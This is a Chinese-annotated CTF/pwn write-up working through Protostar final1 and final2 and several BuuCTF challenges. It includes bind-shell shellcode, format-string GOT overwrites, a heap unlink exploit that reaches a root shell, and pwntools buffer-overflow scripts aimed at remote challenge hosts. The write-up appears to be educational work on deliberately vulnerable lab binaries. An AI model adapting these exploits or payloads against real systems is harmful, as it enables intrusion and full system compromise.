root@bt:/opt/metasploit/apps/pro/msf3/tools# msfpayload linux/x86/shell_bind_tcp c
/*
* linux/x86/shell_bind_tcp - 78 bytes
* http://www.metasploit.com
* VERBOSE=false, LPORT=4444, RHOST=, PrependSetresuid=false,
* PrependSetreuid=false, PrependSetuid=false,
* PrependSetresgid=false, PrependSetregid=false,
* PrependSetgid=false, PrependChrootBreak=false,
* AppendExit=false, InitialAutoRunScript=, AutoRunScript=
*/
unsigned char buf[] =
"\x31\xdb\xf7\xe3\x53\x43\x53\x6a\x02\x89\xe1\xb0\x66\xcd\x80"
"\x5b\x5e\x52\x68\x02\x00\x11\x5c\x6a\x10\x51\x50\x89\xe1\x6a"
"\x66\x58\xcd\x80\x89\x41\x04\xb3\x04\xb0\x66\xcd\x80\x43\xb0"
"\x66\xcd\x80\x93\x59\x6a\x3f\x58\xcd\x80\x49\x79\xf8\x68\x2f"
"\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0"
"\x0b\xcd\x80";
```

```python
root@protostar:/opt/protostar/bin# python -c 'print "username x\x1c\xa1\x04\x08\x1d\xa1\x04\x08\x1e\xa1\x04\x08\x1f\xa1\x04\x08" + "%15$n%16$n%17$n%18$n" + "\nlogin b\nlogin test"' | nc localhost 2994 如果成功修改got地址 第二次执行syslog时ip跳到此处就会不知道执行什么 从而触发核心转储
[final1] $ [final1] $ login failed
[final1] $ root@protostar:/opt/protostar/bin# ls -al /tmp/ 核心转储存储在/tmp目录下
total 104
drwxrwxrwt  2 root root     60 Mar 11 08:15 .
drwxr-xr-x 26 root root    180 Mar 11 07:29 ..
-rw-------  1 root root 294912 Mar 11 08:15 core.11.final1.1811
root@protostar:/opt/protostar/bin# gdb -q -c /tmp/core.11.final1.1811 "使用-c参数调试核心转储文件"
Core was generated by `/opt/protostar/bin/final1'.
Program terminated with signal 11, Segmentation fault.
#0  0x30303030 in ?? () 可以看到eip跳到0x30303030地址不知道是干什么的 即syslog_got被成功修改为0x30303030
(gdb)

root@protostar:/opt/protostar/bin# python -c 'print "username x\x1c\xa1\x04\x08\x1d\xa1\x04\x08\x1e\xa1\x04\x08\x1f\xa1\x04\x08" + "%15$n%16$n%17$n%18$n" + "\nlogin b\nlogin " + "\x31\xdb\xf7\xe3\x53\x43\x53\x6a\x02\x89\xe1\xb0\x66\xcd\x80\x5b\x5e\x52\x68\x02\x00\x11\x5c\x6a\x10\x51\x50\x89\xe1\x6a\x66\x58\xcd\x80\x89\x41\x04\xb3\x04\xb0\x66\xcd\x80\x43\xb0\x66\xcd\x80\x93\x59\x6a\x3f\x58\xcd\x80\x49\x79\xf8\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"' | nc localhost 2994
[final1] $ [final1] $ login failed #再次eip跳转无效核心转储
[final1] $ root@protostar:/opt/protls -al /tmp/total 208
drwxrwxrwt  2 root root     80 Mar 11 08:25 .
drwxr-xr-x 26 root root    180 Mar 11 07:29 ..
-rw-------  1 root root 294912 Mar 11 08:19 core.11.final1.1823
-rw-------  1 root root 294912 Mar 11 08:25 core.11.final1.1851
root@protostar:/opt/protostar/bin# gdb -q -c /tmp/core.11.final1.1851 
Core was generated by `/opt/protostar/bin/final1'.
Program terminated with signal 11, Segmentation fault.
#0  0x30303030 in ?? ()
(gdb) x/64wx $esp #查看栈信息
0xbffff98c:	0x080498ef	0x0000000f	0xbffff9b0	0x08049ee4
0xbffff99c:	0x0804a2a0	0x0804a220	0xbffffbd6	0xb7fd7ff4
0xbffff9ac:	0xbffffa28	0x69676f4c	0x7266206e	0x31206d6f
0xbffff9bc:	0x302e3732	0x312e302e	0x3237343a	0x61203835
0xbffff9cc:	0x785b2073	0x0804a11c	0x0804a11d	0x0804a11e
0xbffff9dc:	0x0804a11f	0x24353125	0x3631256e	0x31256e24
0xbffff9ec:	0x256e2437	0x6e243831	0x6977205d	0x70206874
0xbffff9fc:	0x77737361	0x2064726f	0xf7db315b	0x534353e3 #从这里找到了shellcode
0xbffffa0c:	0xe189026a	0x80cd66b0	0x68525e5b	0x000a5d02
0xbffffa1c:	0x00000001	0xbffffaac	0xb7febfc6	0xb7ea98e4
0xbffffa2c:	0x0000001b	0xb7ea1cd4	0xb7fe1afc	0x1c9395bb
0xbffffa3c:	0xb7ff15a0	0x00000003	0xb7fff8f8	0x00000000
0xbffffa4c:	0xb7e9adc4	0xb7ffb71c	0xbffffa74	0xb7fe1b28
0xbffffa5c:	0x00000011	0xb7e9c814	0xb7fe1afc	0x7c9c7b11
0xbffffa6c:	0x00000001	0x00000003	0xb7fff8f8	0x00000000
0xbffffa7c:	0x00000000	0x00000001	0x000001a5	0xb7fe1b28
(gdb) x/64wx 0xbffffa04 #计算得到shellcode的入口地址
0xbffffa04:	0xf7db315b	0x534353e3	0xe189026a	0x80cd66b0 #可以看见shellcode在此地址的第一个位置
0xbffffa14:	0x68525e5b	0x000a5d02	0x00000001	0xbffffaac
0xbffffa24:	0xb7febfc6	0xb7ea98e4	0x0000001b	0xb7ea1cd4
0xbffffa34:	0xb7fe1afc	0x1c9395bb	0xb7ff15a0	0x00000003
0xbffffa44:	0xb7fff8f8	0x00000000	0xb7e9adc4	0xb7ffb71c
0xbffffa54:	0xbffffa74	0xb7fe1b28	0x00000011	0xb7e9c814
0xbffffa64:	0xb7fe1afc	0x7c9c7b11	0x00000001	0x00000003
0xbffffa74:	0xb7fff8f8	0x00000000	0x00000000	0x00000001
0xbffffa84:	0x000001a5	0xb7fe1b28	0xb7fe1848	0x08048728
0xbffffa94:	0xb7ea3f14	0x080485ac	0x00000001	0xb7ffeff4
0xbffffaa4:	0xbffffb90	0xb7fffab0	0xbffffb64	0xb7fec242
0xbffffab4:	0xbffffb54	0x080485ac	0xbffffb48	0xb7fffa54
0xbffffac4:	0x00000000	0xb7fe1b28	0x00000001	0x00000000
0xbffffad4:	0x00000001	0xb7fff8f8	0xb7fff8f8	0x00000000
0xbffffae4:	0xb7fd8420	0xb7fd7ff4	0xb7efdf5b	0x00000000
0xbffffaf4:	0xb7fd8467	0x00000001	0xb7e966c0	0xb7fd84c0
#拿到shellcode入口地址为0xbffffa04
#计算偏差 计算格式化字符串时应该输出的字符数
#将shellcode入口地址0xbffffa04写入syslog_got地址中
#\x04\xfa\xff\xbf
#\x04\x01  \xfa\x01   \xff\x02   \xbf\x03 补充来使数据从小到大 多出去的数据会溢出去
# 0x104      0x1fa     0x2ff      0x3bf
#0x104 - 0x30 = 0xd4 = 212
#0x1fa - 0x104 = 0xf6 = 246
#0x2ff - 0x1fa = 0x105 = 261 此处调整过 原本为0x1ff - 0x1fa = 0x5 = 5 但是写入的时候因为内存没有对齐导致数据写入不对
#0x3bf - 0x2ff = 0xc0 = 192
root@protostar:/opt/protostar/bin# python -c 'print "username x\x1c\xa1\x04\x08\x1d\xa1\x04\x08\x1e\xa1\x04\x08\x1f\xa1\x04\x08" + "%212x%15$n%246x%16$n%261x%17$n%192x%18$n" + "\nlogin b\nlogin " + "\x31\xdb\xf7\xe3\x53\x43\x53\x6a\x02\x89\xe1\xb0\x66\xcd\x80\x5b\x5e\x52\x68\x02\x00\x11\x5c\x6a\x10\x51\x50\x89\xe1\x6a\x66\x58\xcd\x80\x89\x41\x04\xb3\x04\xb0\x66\xcd\x80\x43\xb0\x66\xcd\x80\x93\x59\x6a\x3f\x58\xcd\x80\x49\x79\xf8\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"' | nc localhost 2994
[final1] $ [final1] $ login failed
[final1] $ root@protostar:/opt/protls -al /tmp/total 728
drwxrwxrwt  2 root root    180 Mar 12 04:21 .
drwxr-xr-x 26 root root    180 Mar 11 23:22 ..
-rw-------  1 root root 294912 Mar 12 01:26 core.11.final1.2043
-rw-------  1 root root 294912 Mar 12 04:02 core.11.final1.2224
-rw-------  1 root root 294912 Mar 12 04:06 core.11.final1.2243
-rw-------  1 root root 294912 Mar 12 04:07 core.11.final1.2247
-rw-------  1 root root 294912 Mar 12 04:08 core.11.final1.2254
-rw-------  1 root root 294912 Mar 12 04:13 core.11.final1.2271
-rw-------  1 root root 294912 Mar 12 04:21 core.11.final1.2290
root@protostar:/opt/protostar/bin# gdb -q -c /tmp/core.11.final1.2290
Core was generated by `/opt/protostar/bin/final1'.
Program terminated with signal 11, Segmentation fault.
#0  0xbffffa09 in ?? () 此处可见已成功将跳转syslog_got地址修改为0xbffffa09
(gdb) x/60wx $esp
0xbffff990:	0x0000000f	0xbffff9b0	0x08049ee4	0x0804a2a0
0xbffff9a0:	0x0804a220	0xbffffbd6	0xb7fd7ff4	0xbffffa28
0xbffff9b0:	0x69676f4c	0x7266206e	0x31206d6f	0x302e3732
0xbffff9c0:	0x312e302e	0x3139333a	0x61203234	0x785b2073
0xbffff9d0:	0x0804a11c	0x0804a11d	0x0804a11e	0x0804a11f
0xbffff9e0:	0x38363425	0x35312578	0x35256e24	0x25783230
0xbffff9f0:	0x6e243631	0x31363225	0x37312578	0x31256e24
0xbffffa00:	0x25783239	0x6e243831	0x6977205d	0x70206874
0xbffffa10:	0x77737361	0x2064726f	0xf7db315b	0x534353e3 #0xf7db315b 因为增加了偏移导致了shellcode发生了位移
0xbffffa20:	0xe189026a	0x80cd66b0	0x68525e5b	0x000a5d02
0xbffffa30:	0xb7ea1cd4	0xb7fe1afc	0x1c9395bb	0xb7ff15a0
0xbffffa40:	0x00000003	0xb7fff8f8	0x00000000	0xb7e9adc4
0xbffffa50:	0xb7ffb71c	0xbffffa74	0xb7fe1b28	0x00000011
0xbffffa60:	0xb7e9c814	0xb7fe1afc	0x7c9c7b11	0x00000001
0xbffffa70:	0x00000003	0xb7fff8f8	0x00000000	0x00000000
(gdb) x/30bx 0xbffffa19 #得到偏移后shellcode的位移地址
0xbffffa19:	0x31	0xdb	0xf7	0xe3	0x53	0x43	0x53	0x6a
0xbffffa21:	0x02	0x89	0xe1	0xb0	0x66	0xcd	0x80	0x5b
0xbffffa29:	0x5e	0x52	0x68	0x02	0x5d	0x0a	0x00	0xd4
0xbffffa31:	0x1c	0xea	0xb7	0xfc	0x1a	0xfe
#\x19\xfa\xff\xbf
#\x19\x01  \xfa\x01   \xff\x02   \xbf\x03
# 0x119      0x1fa     0x2ff      0x3bf
#0x119 - 0x30 = 0xe9 = 233
#0x1fa - 0x119 = 0xe1 = 225
#0x2ff - 0x1fa = 0x105 = 261
#0x3bf - 0x2ff = 0xc0 = 192
root@protostar:/opt/protostar/bin# python -c 'print "username x\x1c\xa1\x04\x08\x1d\xa1\x04\x08\x1e\xa1\x04\x08\x1f\xa1\x04\x08" + "%233x%15$n%225x%16$n%261x%17$n%192x%18$n" + "\nlogin b\nlogin " + "\x31\xdb\xf7\xe3\x53\x43\x53\x6a\x02\x89\xe1\xb0\x66\xcd\x80\x5b\x5e\x52\x68\x02\x00\x11\x5c\x6a\x10\x51\x50\x89\xe1\x6a\x66\x58\xcd\x80\x89\x41\x04\xb3\x04\xb0\x66\xcd\x80\x43\xb0\x66\xcd\x80\x93\x59\x6a\x3f\x58\xcd\x80\x49\x79\xf8\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"' | nc localhost 2994
[final1] $ [final1] $ login failed
[final1] $ root@protostar:/opt/protls -al /tmp/ #程序没有再核心转储
total 728
drwxrwxrwt  2 root root    180 Mar 12 08:05 .
drwxr-xr-x 26 root root    180 Mar 11 23:22 ..
root@protostar:/opt/protostar/bin# nc 127.0.0.1 4444 此时连接之前没有开放的4444端口
whoami #输入命令
root #hacked
```

#### Final2

本体攻击所利用的原理请参考Heap3 后续不再重复
malloc()函数只有一个参数 表示要分配的字节数；calloc()函数有两个参数 表示要分配的元素个数和每个元素的字节数 这两个参数的乘积就是要分配的总字节数
malloc()函数不会初始化分配的内存空间 所以分配后的内存中可能有垃圾数据；calloc()函数会将分配的内存空间中的每一位都初始化为零 所以分配后的内存中都是零值

```c
int get_requests(int fd)
{
  char *buf;
  char *destroylist[256];
  int dll;
  int i;

  dll = 0;
  while(1) {
      if(dll >= 255) break;

      buf = calloc(REQSZ, 1);
     
      destorylist[dll] = buf; //反汇编可以看到该条代码 网站上该条源码被作者遗漏
      //向destorylist中写入数组成员
      if(read(fd, buf, REQSZ) != REQSZ) break; //长度不为128就break

      if(strncmp(buf, "FSRD", 4) != 0) break; //开头不为FSRD就break

      check_path(buf + 4); //没有break就会来到此处调用check_path

      dll++;
  }
  for(i = 0; i < dll; i++) {
                write(fd, "Process OK\n", strlen("Process OK\n"));
      free(destroylist[i]);
  }
}
void check_path(char *buf)
{
  char *start;
  char *p;
  int l;

  /*
  * Work out old software bug
  */

  p = rindex(buf, '/'); //在程序中寻找最右边为起始下标寻找 '/' 并返回下标
  l = strlen(p); //保存下标
  if(p) { //如果存在'/'
      start = strstr(buf, "ROOT"); //从字符串中寻找ROOT
      if(start) { //如果找到了
          while(*start != '/') start--; //以此下标向左搜寻'/' 即向低地址查找 假如ROOT左边没有'/'就会一直向左边查找 没有对start--做限制 为漏洞点
          memmove(start, p, l); //如果ROOT左边的低地址找到了'/'，那么把右边的的'/'内容写入到左边的'/'
          //void *memmove (void *dest, const void *src, size_t n); // 移动n个字节的内容从src到dest
          printf("moving from %p to %p (exploit: %s / %d)\n", p, start, start < buf ?
          "yes" : "no", start - buf);
      }
  }
}
```

![image-20230313102736895](./Pwn/Protostar_final2_show1.png)

![image-20230313102813969](./Pwn/Protostar_final2_show2.png)

```python
root@protostar:/opt/protostar/bin# python -c 'print "FSRD" + "A"*123 + "/" + "FSRD" + "ROOT" + "/" + "A"*119' | nc 127.0.0.1 2993
root@protostar:/opt/protostar/bin# gdb /opt/protostar/bin/final2 /tmp/core.11.final2.2401 
GNU gdb (GDB) 7.0.1-debian
Copyright (C) 2009 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
and "show warranty" for details.
This GDB was configured as "i486-linux-gnu".
For bug reporting instructions, please see:
<http://www.gnu.org/software/gdb/bugs/>...
Reading symbols from /opt/protostar/bin/final2...done.

warning: Can't read pathname for load map: Input/output error.
Reading symbols from /lib/libc.so.6...Reading symbols from /usr/lib/debug/lib/libc-2.11.2.so...done.
(no debugging symbols found)...done.
Loaded symbols for /lib/libc.so.6
Reading symbols from /lib/ld-linux.so.2...Reading symbols from /usr/lib/debug/lib/ld-2.11.2.so...done.
(no debugging symbols found)...done.
Loaded symbols for /lib/ld-linux.so.2
Core was generated by `/opt/protostar/bin/final2'.
Program terminated with signal 11, Segmentation fault.
#0  0x0804aabf in free (mem=0x804e008) at final2/../common/malloc.c:3643 可以看见是在调用free的时候crash的
3643	final2/../common/malloc.c: No such file or directory.
	in final2/../common/malloc.c
(gdb) q
root@protostar:/opt/protostar/bin# objdump -R /opt/protostar/bin/final2 | grep write 
0804d41c R_386_JUMP_SLOT   write #拿到write_got地址
0804d468 R_386_JUMP_SLOT   fwrite
root@protostar:/opt/protostar/bin# python -c 'print "FSRD" + "A"*123 + "/" + "FSRD" + "ROOT" + "/" + "\xf0\xff\xff\xff\xfc\xff\xff\xff" + "b"*111' | nc 127.0.0.1 2993
Process OK
root@protostar:/opt/protostar/bin# ls -al /tmp/
total 84
drwxrwxrwt  2 root root     60 Mar 13 03:43 .
drwxr-xr-x 26 root root    180 Mar 12 21:00 ..
-rw-------  1 root root 163840 Mar 13 03:43 core.11.final2.2707
root@protostar:/opt/protostar/bin# gdb /opt/protostar/bin/final2 /tmp/core.11.final2.2707 
GNU gdb (GDB) 7.0.1-debian
Copyright (C) 2009 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
and "show warranty" for details.
This GDB was configured as "i486-linux-gnu".
For bug reporting instructions, please see:
<http://www.gnu.org/software/gdb/bugs/>...
Reading symbols from /opt/protostar/bin/final2...done.

warning: Can't read pathname for load map: Input/output error.
Reading symbols from /lib/libc.so.6...Reading symbols from /usr/lib/debug/lib/libc-2.11.2.so...done.
(no debugging symbols found)...done.
Loaded symbols for /lib/libc.so.6
Reading symbols from /lib/ld-linux.so.2...Reading symbols from /usr/lib/debug/lib/ld-2.11.2.so...done.
(no debugging symbols found)...done.
Loaded symbols for /lib/ld-linux.so.2
Core was generated by `/opt/protostar/bin/final2'.
Program terminated with signal 11, Segmentation fault.
#0  0x0804aaef in free (mem=0x804e008) at final2/../common/malloc.c:3648
3648	final2/../common/malloc.c: No such file or directory.
	in final2/../common/malloc.c
(gdb) set disassembly-flavor intel #设置反汇编格式为intel
(gdb) x/i $eip #汇编格式查看eip下一条执行命令
0x804aaef <free+301>:	mov    DWORD PTR [eax+0xc],edx
(gdb) i r
eax            0x62626262	1650614882 #eax被覆盖为bbbb
ecx            0x804c2d6	134529750
edx            0x62626262	1650614882 #ebx被覆盖为bbbb
ebx            0xb7fd7ff4	-1208123404
esp            0xbffff7e0	0xbffff7e0
ebp            0xbffff828	0xbffff828
esi            0x0	0
edi            0x0	0
eip            0x804aaef	0x804aaef <free+301>
eflags         0x10246	[ PF ZF IF RF ]
cs             0x73	115
ss             0x7b	123
ds             0x7b	123
es             0x7b	123
fs             0x0	0
gs             0x33	51
root@protostar:/opt/protostar/bin# python -c 'print "FSRD" + "A"*123 + "/" + "FSRD" + "ROOT" + "/" + "\xf0\xff\xff\xff\xfc\xff\xff\xff" + "a"*4 + "b"*4 + "c" * 108' | nc 127.0.0.1 2993 进一步分清eax ebx是被哪一部分payload写入的
Process OK
root@protostar:/opt/protostar/bin# ls -al /tmp/
total 168
drwxrwxrwt  2 root root     80 Mar 13 02:53 .
drwxr-xr-x 26 root root    180 Mar 12 21:00 ..
-rw-------  1 root root 163840 Mar 13 02:53 core.11.final2.2575
root@protostar:/opt/protostar/bin# gdb /opt/protostar/bin/final2 /tmp/core.11.final2.2575
(gdb) i r
eax            0x61616161	1633771873 #eax被覆盖为aaaa
ecx            0x804c2d6	134529750
edx            0x62626262	1650614882 #ebx被覆盖为bbbb
ebx            0xb7fd7ff4	-1208123404
esp            0xbffff7e0	0xbffff7e0
ebp            0xbffff828	0xbffff828
esi            0x0	0
edi            0x0	0
eip            0x804aaef	0x804aaef <free+301>
eflags         0x10246	[ PF ZF IF RF ]
cs             0x73	115
ss             0x7b	123
ds             0x7b	123
es             0x7b	123
fs             0x0	0
gs             0x33	51
root@protostar:/opt/protostar/bin# python -c 'print "FSRD" + "A"*123 + "/" + "FSRD" + "ROOT" + "/" + "\xf0\xff\xff\xff\xfc\xff\xff\xff" + "\x1c\xd4\x04\x08" + "aaaa" + "c"*108' | nc 127.0.0.1 2993
Process OK
root@protostar:/opt/protostar/bin# ls -al /tmp/
total 168
drwxrwxrwt  2 root root     80 Mar 13 03:49 .
drwxr-xr-x 26 root root    180 Mar 12 21:00 ..
-rw-------  1 root root 163840 Mar 13 03:43 core.11.final2.2707
-rw-------  1 root root 163840 Mar 13 03:49 core.11.final2.2714
root@protostar:/opt/protostar/bin# gdb /opt/protostar/bin/final2 /tmp/core.11.final2.2714 
GNU gdb (GDB) 7.0.1-debian
Copyright (C) 2009 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
and "show warranty" for details.
This GDB was configured as "i486-linux-gnu".
For bug reporting instructions, please see:
<http://www.gnu.org/software/gdb/bugs/>...
Reading symbols from /opt/protostar/bin/final2...done.

warning: Can't read pathname for load map: Input/output error.
Reading symbols from /lib/libc.so.6...Reading symbols from /usr/lib/debug/lib/libc-2.11.2.so...done.
(no debugging symbols found)...done.
Loaded symbols for /lib/libc.so.6
Reading symbols from /lib/ld-linux.so.2...Reading symbols from /usr/lib/debug/lib/ld-2.11.2.so...done.
(no debugging symbols found)...done.
Loaded symbols for /lib/ld-linux.so.2
Core was generated by `/opt/protostar/bin/final2'.
Program terminated with signal 11, Segmentation fault.
#0  0x0804aaf8 in free (mem=0x804e008) at final2/../common/malloc.c:3648
3648	final2/../common/malloc.c: No such file or directory.
	in final2/../common/malloc.c
(gdb) x/10x 0x0804d41c
0x804d41c <_GLOBAL_OFFSET_TABLE_+64>:	0xb7f53c70	0xb7f63a60	0xb7f0bc60	0x61616161 #可以看见aaaa被写入了write_got 将
0x804d42c <_GLOBAL_OFFSET_TABLE_+80>:	0xb7f2d890	0xb7f78be0	0xb7f53c00	0xb7f2efc0
0x804d43c <_GLOBAL_OFFSET_TABLE_+96>:	0xb7f2f040	0xb7f5ab20
(gdb) 
```

```shell
root@bt:/opt/metasploit/apps/pro/msf3/tools# msfpayload linux/x86/shell_bind_tcp c
/*
* linux/x86/shell_bind_tcp - 78 bytes
* http://www.metasploit.com
* VERBOSE=false, LPORT=4444, RHOST=, PrependSetresuid=false,
* PrependSetreuid=false, PrependSetuid=false,
* PrependSetresgid=false, PrependSetregid=false,
* PrependSetgid=false, PrependChrootBreak=false,
* AppendExit=false, InitialAutoRunScript=, AutoRunScript=
*/
unsigned char buf[] =
"\x31\xdb\xf7\xe3\x53\x43\x53\x6a\x02\x89\xe1\xb0\x66\xcd\x80"
"\x5b\x5e\x52\x68\x02\x00\x11\x5c\x6a\x10\x51\x50\x89\xe1\x6a"
"\x66\x58\xcd\x80\x89\x41\x04\xb3\x04\xb0\x66\xcd\x80\x43\xb0"
"\x66\xcd\x80\x93\x59\x6a\x3f\x58\xcd\x80\x49\x79\xf8\x68\x2f"
"\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0"
"\x0b\xcd\x80";
```

```python
import socket
HOST = "127.0.0.1"
PORT = 2993
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((HOST, PORT))
shellcode = "\x31\xdb\xf7\xe3\x53\x43\x53\x6a\x02\x89\xe1\xb0\x66\xcd\x80" \
		   "\x5b\x5e\x52\x68\x02\x00\x11\x5c\x6a\x10\x51\x50\x89\xe1\x6a" \
		   "\x66\x58\xcd\x80\x89\x41\x04\xb3\x04\xb0\x66\xcd\x80\x43\xb0" \ 		
		   "\x66\xcd\x80\x93\x59\x6a\x3f\x58\xcd\x80\x49\x79\xf8\x68\x2f" \
		   "\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0" \
		   "\x0b\xcd\x80"
hdr = "\xfe\xff\xff\xff" + "\xfc\xff\xff\xff" + "\x10\xd4\x04\x08" + "\x18\xe1\x04\x08"
s.sendall("FSRD" + 'a'*123 + "/")
s.sendall("FSRD" + "ROOT" + 'b'*(119 - len(hdr)) + "/" + hdr)
s.sendall('c'*(128 - len(shellcode)) + shellcode)
print s.recv(1024)
s.close()
```

```shell
root@protostar:/opt/protostar/bin# nc 127.0.0.1 4444
whoami 
root
pwd
/
```

## BuuCTF

### test_your_nc

```shell
nc [ip.address] [port]
cat flag
```

### rip

```bash
root@ubuntu:/home/sxylao1/pwn/questions/BuuCTF-rip# checksec pwn1 
[*] '/home/sxylao1/pwn/questions/BuuCTF-rip/pwn1'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE (0x400000)
    RWX:      Has RWX segments
```

ida64打开Shift+F12查看字符串看见system('/bin/sh')点进去，其后有源地址，双击进入按空格从伪代码来到汇编，得到地址`0x40118A`
点击main并F5查看伪代码，双击进入 char s[15] 中发现缓冲区刚好溢出的大小是23个字节位置
![image-20230328204653504](./Pwn/BuuCTF-RIP.png)

```python
from pwn import *
proc = remote('node4.buuoj.cn', 26544)
#proc = process('./pwn1')
binsh = 0x0040118A
junk = b'a'*23
payload = junk + p64(binsh)
proc.sendline(payload)
proc.interactive()
```

### warmup_csaw_2016

```bash
root@ubuntu:/home/sxylao1/pwn/questions/warmup_csaw_2016# checksec warmup_csaw_2016 
[*] '/home/sxylao1/pwn/questions/warmup_csaw_2016/warmup_csaw_2016'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE (0x400000)
    RWX:      Has RWX segments
```

ida64进入查看字符串发现`cat flag.txt`，点击跳转拿到地址`0x400611`，主函数中发现`gets(v5)`，点击发现为64Byte，下面还有8Byte的ebp地址，一并覆盖为72Byte

```python
from pwn import *
proc = remote('node4.buuoj.cn', 26544)
#proc = process('./warmup_csaw_2016')
junk = b'a'*72
flag = p64(0x00400611)
payload = junk + flag
proc.sendline(payload)
proc.interactive()
```

### ciscn_2019_n_1

```bash
root@ubuntu:/home/sxylao1/pwn/questions/ciscn_2019_n_1# checksec ciscn_2019_n_1 
[*] '/home/sxylao1/pwn/questions/ciscn_2019_n_1/ciscn_2019_n_1'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

ida64查看字符串看见`cat/ flag`，拿到地址`0x004006BE`，溢出修改v2为11.28125即可，其数值十六进制为41348000

![image-20230328214253487](./Pwn/ciscn_2019_n_1.png)

```python
from pwn import *
proc = remote('node4.buuoj.cn', 26544)
#proc = process('./ciscn_2019_n_1')
junk = b'a'*(0x30+0x8)
flag = p64(0x004006BE)
payload = junk + final
proc.sendline(payload)
proc.interactive()
```

### pwn1_sctf_2016

cheksec发现是32位程序，IDA字符串发现`cat flag.txt`，从调用system开始拿到地址`0x08048F0D`。

```c++
printf("Tell me something about yourself: ");
fgets(&s, 32, edata);
std::string::string((int)&v5, (int)"you", (int)&v6);//v5-v6写入you
std::string::string((int)&v7, (int)"I", (int)&v8);//v7-v8写入I 
replace((std::string*)&v4, (std::string*)&input, (std::string*)&v7);//输入的I变成you
std::string::operator=(&input, &v4, v0, &v5);
strcpy(&s, v1);//对比&s和v1，之后输出&s
return printf("So, %s\n", &s);
//发现s为0x3C，加上返回地址4，即输入0x3C+4覆盖 并且程序会把I替换为you，所以I可以变成三个字节
```

```python
from pwn import *
#proc = process('./pwn1_sctf_2016')
proc = remote('node4.buuoj.cn', 26996)
junk = b'I'*21 + b'a'
flag = 0x8048f0d
payload = flat([junk, flag])
proc.sendline(payload)
proc.interactive()
```

### jarvisoj_level0

checksec发现是64位程序，IDA字符串发现`system`和`/bin/sh`，发现`system('/bin/sh')`后门地址为`0x00400597`
阅读`vulnerable_function()`函数的`buf[128]`发现其大小加上返回地址为0x80+0x8

```python
from pwn import *
#proc = process('./level0')
proc = remote('node4.buuoj.cn', 26309)
bakDoor = p64(0x00400597)
junk = b'a'*0x88
payload = junk + bakDoor
proc.sendline(payload)
proc.interactive()
```

### [第五空间2019 决赛]PWN5

```bash
root@ubuntu:/home/sxylao1/pwn/questions/第五空间2019决赛PWN5# checksec pwn 
[*] '/home/sxylao1/pwn/questions/\xe7\xac\xac\xe4\xba\x94\xe7\xa9\xba\xe9\x97\xb42019\xe5\x86\xb3\xe8\xb5\x9bPWN5/pwn'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    Canary found #打开了Canary保护
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
```

IDA打开查看字符串发现存在后门，需要密码与bss段`0x0804C044`内数据相等，同时执行程序返回name时会有格式化字符串漏洞

```bash
root@ubuntu:/home/sxylao1/pwn/questions/第五空间2019决赛PWN5# ./pwn 
your name:aaaa%p%p%p%p%p%p%p%p%p%p
Hello,aaaa0xffa344780x63(nil)(nil)0x30xf7f40a700xf7f5bc080xf7f5ad000xffa3459c0x61616161 #第十个参数泄露
your passwd:shit
fail
```

```python
from pwn import *
context.log_level = 'debug'
#proc = process('./PWN')
proc = remote('node4.buuoj.cn', 26309)
bss = 0x0804C044
payload = p32(bss) + p32(bss+1) + p32(bss+2) + p32(bss+3)
payload += b'%10$hhn%11$hhn%12$hhn%13$hhn'
proc.sendline(payload)
proc.sendline(str(0x10101010)) #将该数据写入栈上 会作为passwd 且会被账号的格式化字符串攻击写入到指定位置从而相等 HACKED
proc.interactive()
```

### ciscn_2019_c_1

```bash
root@ubuntu:/home/sxylao1/pwn/questions/ciscn_2019_c_1# checksec ciscn_2019_c_1 
[*] '/home/sxylao1/pwn/questions/ciscn_2019_c_1/ciscn_2019_c_1'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
root@ubuntu:/home/sxylao1/pwn/questions/ciscn_2019_c_1# ROPgadget --binary ciscn_2019_c_1 --only 'pop|ret' | grep 'rdi'
0x0000000000400c83 : pop rdi ; ret
root@ubuntu:/home/sxylao1/pwn/questions/ciscn_2019_c_1# ROPgadget --binary ciscn_2019_c_1 --only 'ret'
Gadgets information
============================================================
0x00000000004006b9 : ret
```

IDA看了下程序，没有后门，也没有格式化字符串，可以使用puts进行泄露libc基址拿下这个程序，其中strlen()加密内容用`'\0'`绕过或者解析源代码提前做好偏移，使之加密后变为原来的payload

```python
from pwn import *
from LibcSearcher import *
p = remote('node4.buuoj.cn', 25642)
#p = process('./ciscn')
elf = ELF('./ciscn')

main_addr = 0x400B28
pop_rdi = 0x400C83

puts_got = elf.got['puts']
puts_plt = elf.plt['puts']

def encrypt(payload):
    l = list(payload)
    for i in range(len(l)):
        if l[i].isdigit():
            l[i] = chr(ord(l[i])^0xF)
        elif l[i].isupper():
            l[i] = chr(ord(l[i])^0xE)
        elif l[i].islower():
